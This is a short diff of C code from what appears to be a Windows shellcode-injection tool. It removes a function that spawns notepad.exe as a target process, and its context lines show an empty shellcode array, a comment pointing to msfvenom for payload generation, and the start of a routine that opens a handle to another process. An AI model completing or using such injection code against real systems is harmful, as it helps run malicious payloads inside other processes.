@@ -74,30 +74,6 @@ LPVOID rBuffer = NULL;
 // you can generate a payload for x64 using msfvenom
 unsigned char shellCode[] = "";
 
-
-int SpawnProc()
-{
-	if (!CreateProcessW(
-		L"C:\\Windows\\System32\\notepad.exe", // lpApplicationName
-		NULL,
-		NULL,
-		NULL,
-		FALSE,
-		BELOW_NORMAL_PRIORITY_CLASS,
-		NULL,
-		NULL,
-		&si,
-		&pi
-	))
-	{
-		printf("%s CreateProcessW() failed (%d)\n", e, GetLastError());
-		return EXIT_FAILURE;
-	}
-	pid = pi.dwProcessId;
-	printf("%s Process created with the PID (%ld)\n", s, pid);
-	return pid;
-}
-
 int hookProc(DWORD pid)
 {
 	printf("%s Trying to open a handle to the process with the PID (%ld)\n", s, pid);
